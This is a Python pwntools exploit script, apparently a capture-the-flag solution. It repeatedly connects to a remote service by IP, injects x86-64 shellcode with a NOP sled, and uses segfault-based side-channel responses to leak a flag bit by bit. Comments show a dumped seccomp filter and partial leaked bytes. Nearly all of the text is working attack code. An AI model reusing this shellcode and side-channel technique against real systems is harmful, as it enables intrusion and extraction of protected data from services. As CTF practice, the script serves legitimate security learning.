from pwn import *


def change_oracle_target(shellcode_f, shift, byte):
    payload = open(shellcode_f, "r").read()
    payload = payload.replace("\x44", p8(shift))
    payload = payload.replace("\x22", p8(byte))
    return payload


byte = 1
shift = 7
out = ""
num_bits = 150 * 8
for _ in range(0, num_bits):
    r = remote("138.68.67.161", 20001)
    # r = remote("0.0.0.0", 9998)

    r.recvuntil(")\n")

    shellcode = "5e87d731c031ff0f05".decode("hex")

    # payload = change_oracle_target("read_rules", shift, byte)
    # Output so far is:  0x0 0x0 0x0 0x4 0x0 0x0 0x0 0x15 0x0 0x0 0xa 0x3e 0x0 0x0 0xc0 0x20 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x35 0x0 0x8 0x0 0x0 0x0 0x0 0x40 0x15 0x0 0x6 0x0 0x2 0x0 0x0 0x0 0x15 0x0 0x5 0x0 0x38 0x0 0x0 0x0 0x15 0x0 0x0 0x5 0x0 0x0 0x0 0x0 0x20 0x0 0x0 0x0 0x10 0x0 0x0 0x0 0x15 0x0 0x0 0x2 0x3 0x0 0x0 0x0 0x20 0x0 0x0 0x0 0x18 0x0 0x0 0x0 0x15 0x0 0x0 0x1 0x88 0x28 0x60 0x0 0x6 0x0 0x0 0x0 0x0 0x0 0xff 0x7b 0x6 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0

    #  line  CODE  JT   JF      K
    # =================================
    #  0000: 0x20 0x00 0x00 0x00000004  A = arch
    #  0001: 0x15 0x00 0x0a 0xc000003e  if (A != ARCH_X86_64) goto 0012
    #  0002: 0x20 0x00 0x00 0x00000000  A = sys_number
    #  0003: 0x35 0x08 0x00 0x40000000  if (A >= 0x40000000) goto 0012
    #  0004: 0x15 0x06 0x00 0x00000002  if (A == open) goto 0011
    #  0005: 0x15 0x05 0x00 0x00000038  if (A == clone) goto 0011
    #  0006: 0x15 0x00 0x05 0x00000000  if (A != read) goto 0012
    #  0007: 0x20 0x00 0x00 0x00000010  A = fd # read(fd, buf, count)
    #  0008: 0x15 0x00 0x02 0x00000003  if (A != 0x3) goto 0011
    #  0009: 0x20 0x00 0x00 0x00000018  A = buf # read(fd, buf, count)
    #  0010: 0x15 0x00 0x01 0x00602888  if (A != 0x602888) goto 0012
    #  0011: 0x06 0x00 0x00 0x7bff0000  return
    #  0012: 0x06 0x00 0x00 0x00000000  return KILL
    #  0013: 0x00 0x00 0x00 0x00000000  A = 0
    #  0014: 0x00 0x00 0x00 0x00000000  A = 0
    #  0015: 0x00 0x00 0x00 0x00000000  A = 0
    #  0016: 0x00 0x00 0x00 0x00000000  A = 0
    #  0017: 0x00 0x00 0x00 0x00000000  A = 0

    payload = change_oracle_target("read_flag", shift, byte)

    r.sendline("Y\x00" + shellcode + 13 * "\x90" + payload)

    res = ""
    res = r.clean(2)
    r.close()
    print res
    if "Seg" in res:
        out += "1"
    else:
        out += "0"
    shift -= 1
    if shift < 0:
        byte += 1
        shift = 7
        print "Output so far is: ", " ".join(
            [hex(int(out[i : i + 8], 2)) for i in range(0, len(out), 8)]
        )
        print "ASCII output: ", hex(int(out, 2))[2:].decode("hex")
